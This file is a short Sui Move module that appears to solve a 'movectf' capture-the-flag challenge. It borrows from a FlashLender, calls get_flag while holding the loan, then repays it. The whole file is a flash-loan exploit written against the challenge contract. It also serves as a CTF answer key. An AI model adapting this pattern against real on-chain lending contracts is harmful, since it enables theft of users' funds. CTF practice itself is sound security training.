module solve::solve {
    use movectf::flash::{Self, FlashLender};
    use sui::tx_context::{TxContext};

    public entry fun solve(flash_lender: &mut FlashLender, ctx: &mut TxContext) {
        let (loan, receipt) = flash::loan(flash_lender, 1000, ctx);
        flash::get_flag(flash_lender, ctx);
        flash::repay(flash_lender, loan);
        flash::check(flash_lender, receipt);
    }
}
